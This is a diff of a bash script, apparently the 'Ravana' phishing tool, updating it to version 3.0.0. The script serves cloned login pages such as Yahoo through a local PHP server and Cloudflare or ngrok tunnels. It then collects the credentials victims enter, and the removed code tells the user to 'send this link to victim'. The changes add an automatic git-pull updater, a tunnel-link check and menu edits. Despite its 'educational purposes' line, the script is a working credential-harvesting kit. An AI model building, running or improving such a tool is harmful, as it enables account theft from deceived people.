@@ -1,7 +1,8 @@
 #!/usr/bin/bash
 #@Author prince kumar
 #Date 23 dec 2020
-# Version V2.5.0
+# Version V3.0.0
+#adding the parrto support in ravana 3.0.0 
 #This is made only for educational purposes...
 # Satrt coding here
 # Define some color coding here
@@ -25,6 +26,20 @@ user_intrupt(){
 	printf " \n"
 	sleep 1
 	exit 1
+}
+# make a function to update the ravana if any update is availble 
+up_date(){
+	echo -ne ""
+	curl https://raw.githubusercontent.com/princekrvert/Ravana/master/version --output vs > /dev/null 2>&1
+	ver=$(cat vs)
+	if [[ $ver == "V.3.0.0" ]];then
+	echo -ne ""
+	else 
+	echo -e "\0e[36;1m New version is available .. "
+	echo -ne " updating the ravana.........."
+	git pull https://github.com/princekrvert/Ravana.git
+	fi 
+	rm -rf vs > /dev/null 
 }
 #Make a function to check for user data--------
 check_cred(){
@@ -72,7 +87,11 @@ start_cloud(){
     echo -ne "\e[36;1m Link: "
 	link=$(cat .pk.txt | grep "trycloudflare" | cut -d "|" -f2 | cut -d "}" -f2)
     cat .pk.txt | grep "trycloudflare" | cut -d "|" -f2 | cut -d "}" -f2
-	mask $1 $2 $link
+	if [[ ${#link} < 10 ]];then
+		echo -ne "\e[32;1m [!] Some problem occur . please run the script again.."
+	else
+		mask $1 $2 $link
+	fi
 	check_cred $1
 }
 #make a function to download the cloudflared 
@@ -98,53 +117,6 @@ else
     fi
 fi
 }
-#Make a server for handle ngrok request
-s_ngrok(){
-
-	echo -e " "
-	if [[ -e ngrok ]];then
-		echo -e "${r}[${w}+${r}] ${g} Turn on your hotspot "
-		chmod +x ngrok
-
-	else
-		echo -e "${r}[${w}+${r}] ${g} Downloding ngrok "
-		#wget https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip > /dev/null 2>&1
-		#unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-	fi
-	ran=$((RANDOM % 10))
-	php -S 127.0.0.1:800$ran -t .pweb/$1 > /dev/null 2>&1 & sleep 2
-	./ngrok http 127.0.0.1:800$ran > /dev/null 2>&1 & sleep 8
-	n_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-	echo -e "${y}[${w}+${y}]${r} Send this link to victim"
-	echo -e " "
-	echo -e "${r}[${w}+${r}] ${p} Ngrok link:${w} $n_link"
-	#Now call the check cred----------
-	check_cred $1
-
-
-}
-#End of ngrok function------
-# make a function to update the tool
-updateme(){
-    echo -e "\e[31;1m Checking version of the tool ...."
-    version=$(curl -s https://raw.githubusercontent.com/princekrvert/Ravana/main/version)
-    if [[ $version == 2.5.0 ]];then
-    echo " "
-    else
-    echo -e "\e[92;1m[~] New version of ravana found... "
-	echo -ne "\e[32;1m Press y to update: "
-	read up
-	if [[ ( $up == "y") || ( $up == "Y") ]];then
-	echo -ne "Updating ravana please wait..."
-    git pull https://github.com/princekrvert/Ravana.git > /dev/null 2>&1 & echo -e "${g}[⏰${g}] ${b} wait..."
-	echo "updated sucessfully "
-	else 
-	echo ""
-	fi
-    fi
-	
-}
-
 #Make a localhost server-----------------------------
 s_localhost(){
 	#start localhost
@@ -183,8 +155,7 @@ server(){
 	echo -e "${g}[${y}+${g}] ${w} Port forwoding "
 	echo -e "\n"
 	echo -e "${p}[${w}01${p}] ${r} Localhost(for devloper)"
-	echo -e "${p}[${w}02${p}] ${r} Ngrok (Not working)"
-	echo -e "${p}[${w}03${p}] ${r} Cloudflare (best)"
+	echo -e "${p}[${w}02${p}] ${r} Cloudflare "
 	echo -e "\n"
 	echo -ne "${y}[${w}~${y}] ${p} Choose an option: "
 	read p_optn
@@ -193,10 +164,6 @@ server(){
 		echo -e "${w}[${r}+${w}] ${g} Starting localhost "
 		s_localhost $1 
 	elif [[ $p_optn -eq 2 ]] || [[ $p_optn -eq 02 ]];then
-		echo -e "\n"
-		echo -e "${w}[${r}+${w}] ${g} Starting Ngrok "
-		s_ngrok $1
-	elif [[ $p_optn -eq 3 ]] || [[ $p_optn -eq 03 ]];then
 		echo -e "\n"
 		echo -e "${w}[${r}+${w}] ${g} Starting clouflare "
 	    check_platform
@@ -216,8 +183,18 @@ about_me(){
 	echo ""
 	echo -e "${g}[${w}+${g}] ${y} I am prince kumar and i am a junior mechanical engineer.\n"
 	echo -e "${g}[${w}01${g}] ${p} Youtube: https://bit.ly/3sAFWqM "
-	echo -e "${g}[${w}02${g}] ${p} Instagram: https://bit.ly/3j6pdIU "
+	echo -e "${g}[${w}02${g}] ${p} Instagram: https://is.gd/B8EytP "
 	echo -e "${g}[${w}03${g}] ${p} Facebook: https://bit.ly/3z49Eaa "
+	read ab_optn
+	if [[ $ab_optn == "01" || $ab_optn == "1" ]];then
+		xdg-open https://bit.ly/3sAFWqM > /dev/null 2>&1
+	elif [[ $ab_optn == "02" || $ab_optn == "2" ]];then
+		xdg-open https://is.gd/B8EytP > /dev/null 2>&1
+	elif [[ $ab_optn == "03" || $ab_optn == "3" ]];then
+		xdg-open https://bit.ly/3z49Eaa > /dev/null 2>&1
+	else 
+	echo -ne "Invalid option"
+	fi
 	else
 	echo " "
 	echo -e "${g}[${w}+${g}] ${y} I am prince kumar and i am a junior mechanical engineer.\n"
@@ -229,18 +206,14 @@ about_me(){
 	if [[ $ab_optn == "01" || $ab_optn == "1" ]];then
 		am start -a android.intent.action.VIEW -d https://bit.ly/3sAFWqM > /dev/null 2>&1
 	elif [[ $ab_optn == "02" || $ab_optn == "2" ]];then
-		am start -a android.intent.action.VIEW -d https://bit.ly/3j6pdIU > /dev/null 2>&1
+		am start -a android.intent.action.VIEW -d https://is.gd/B8EytP > /dev/null 2>&1
 	elif [[ $ab_optn == "03" || $ab_optn == "3" ]];then
 		am start -a android.intent.action.VIEW -d https://bit.ly/3z49Eaa > /dev/null 2>&1
 	else 
 		echo -e "${r} Invalid option 🥵 "
 fi
 fi
-
-
-
 }
-
 # Make a function for checking for requirements...---
 req_m(){
 	printf "${r}_______ ${p} checking for requirements ${r}_______\n"
@@ -260,13 +233,13 @@ req_m(){
  }
 # calling req function
 req_m
-
+up_date
 # make a typewriter for ravana2.0
 type_W(){
 	text=( 'S' 't' 'a' 'r' 't' 'i' 'n' 'g' ' ' 'R' 'a' 'v' 'a' 'n' 'a' )
 	for i in "${text[@]}";do
 		printf " ${r} ${i}"
-		sleep .3
+		sleep .1
 	done
 }
 #call the typewriter
@@ -280,8 +253,8 @@ banner(){
 	printf "
 	        
        ╦═╗╔═╗╦  ╦╔═╗╔╗╔╔═╗
-       ╠╦╝╠═╣╚╗╔╝╠═╣║║║╠═╣ \e[32;1m MADE BY PRINCE
-       ╩╚═╩ ╩ ╚╝ ╩ ╩╝╚╝╩ ╩  \e[0;1m 
+       ╠╦╝╠═╣╚╗╔╝╠═╣║║║╠═╣ \e[0;1m MADE BY PRINCE
+       ╩╚═╩ ╩ ╚╝ ╩ ╩╝╚╝╩ ╩  V3.0.0\e[32;1m 
        Youtube : https://is.gd/UQreTd                                              
 
 "
@@ -405,7 +378,7 @@ case $optn in
 		server "yahoo" "yahoo-account";;
 	20)
 		echo " "
-                echo -ne "${w}[${g}+${w}] ${y}  Please wait"
+                echo -ne "${w}[${g}+${w}] ${y}  "
 		about_me;;
 	*)
 		echo " "
